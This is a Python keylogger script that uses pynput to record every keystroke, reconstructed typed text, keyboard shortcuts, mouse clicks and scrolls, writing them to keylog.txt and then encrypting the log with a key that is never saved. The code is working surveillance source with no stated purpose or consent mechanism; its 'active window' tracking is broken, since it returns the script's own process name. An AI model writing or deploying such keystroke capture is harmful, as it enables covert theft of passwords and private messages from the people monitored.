import psutil
import os
from pynput import keyboard, mouse
import logging
import time
from cryptography.fernet import Fernet
from collections import deque
import threading

# Generate a key for encryption
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Configure logging
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

def get_active_window_process_name():
    try:
        active_window = psutil.Process(os.getpid())
        return active_window.name()
    except psutil.Error as e:
        logging.error(f"Error getting active window process name: {e}")
        return "Unknown"

# Initialize global variables
current_text = deque()
log_buffer = deque()
active_window_name = get_active_window_process_name()
active_window_start_time = time.time()
pressed_keys = set()

def log_event(message):
    log_buffer.append(message)
    if len(log_buffer) >= 10:
        flush_log_buffer()

def flush_log_buffer():
    with open("keylog.txt", "a") as log_file:
        while log_buffer:
            log_file.write(log_buffer.popleft() + "\n")

def log_time_spent_on_window(window_name, start_time):
    time_spent = time.time() - start_time
    log_event(f"Time spent on {window_name}: {time_spent:.2f} seconds")

def handle_window_change():
    global active_window_name, active_window_start_time
    new_window_name = get_active_window_process_name()
    if new_window_name != active_window_name:
        log_time_spent_on_window(active_window_name, active_window_start_time)
        active_window_name = new_window_name
        active_window_start_time = time.time()

def on_press(key):
    try:
        handle_window_change()
        pressed_keys.add(key)
        log_event(f"Key pressed: {key} in {active_window_name}")
    except Exception as e:
        logging.error(f"Error in on_press: {e}")

def on_release(key):
    try:
        handle_window_change()
        if hasattr(key, 'char') and key.char is not None:
            current_text.append(key.char)
        elif key == keyboard.Key.space:
            current_text.append(' ')
        elif key == keyboard.Key.enter:
            current_text.append('\n')

        if key in {keyboard.Key.space, keyboard.Key.enter}:
            log_event(f"Text input: {''.join(current_text)} in {active_window_name}")
            current_text.clear()

        log_event(f"Key released: {key} in {active_window_name}")
        pressed_keys.discard(key)
        if pressed_keys:
            log_event(f"Shortcut used: {', '.join(str(k) for k in pressed_keys)} in {active_window_name}")
        if key == keyboard.Key.esc:
            return False
    except Exception as e:
        logging.error(f"Error in on_release: {e}")

def on_click(x, y, button, pressed):
    try:
        handle_window_change()
        action = "clicked" if pressed else "released"
        log_event(f"Mouse {action} at ({x}, {y}) with {button} in {active_window_name}")
    except Exception as e:
        logging.error(f"Error in on_click: {e}")

def on_scroll(x, y, dx, dy):
    try:
        handle_window_change()
        log_event(f"Mouse scrolled at ({x}, {y}) with delta ({dx}, {dy}) in {active_window_name}")
    except Exception as e:
        logging.error(f"Error in on_scroll: {e}")

def stop_listeners():
    try:
        keyboard_listener.stop()
        mouse_listener.stop()
    except Exception as e:
        logging.error(f"Error stopping listeners: {e}")

def on_key_combination(key):
    try:
        if key == keyboard.KeyCode.from_char('\x03'):  # Ctrl + C
            stop_listeners()
            return False
    except Exception as e:
        logging.error(f"Error in on_key_combination: {e}")

def periodic_flush():
    while True:
        time.sleep(10)
        flush_log_buffer()

def log_active_window():
    while True:
        time.sleep(5)
        handle_window_change()
        log_event(f"Active window: {active_window_name}")

# Set up the keyboard listener
try:
    keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    keyboard_listener.start()
except Exception as e:
    logging.error(f"Error setting up keyboard listener: {e}")

# Set up the mouse listener
try:
    mouse_listener = mouse.Listener(on_click=on_click, on_scroll=on_scroll)
    mouse_listener.start()
except Exception as e:
    logging.error(f"Error setting up mouse listener: {e}")

# Set up the key combination listener
try:
    key_combination_listener = keyboard.Listener(on_press=on_key_combination)
    key_combination_listener.start()
except Exception as e:
    logging.error(f"Error setting up key combination listener: {e}")

# Start the periodic flush thread
flush_thread = threading.Thread(target=periodic_flush, daemon=True)
flush_thread.start()

# Start the active window logging thread
active_window_thread = threading.Thread(target=log_active_window, daemon=True)
active_window_thread.start()

try:
    keyboard_listener.join()
    mouse_listener.join()
    key_combination_listener.join()
except Exception as e:
    logging.error(f"Error joining listeners: {e}")

# Encrypt the log file
try:
    with open("keylog.txt", "rb") as file:
        log_data = file.read()

    encrypted_data = cipher_suite.encrypt(log_data)

    with open("keylog.enc", "wb") as file:
        file.write(encrypted_data)
except Exception as e:
    logging.error(f"Error encrypting log file: {e}")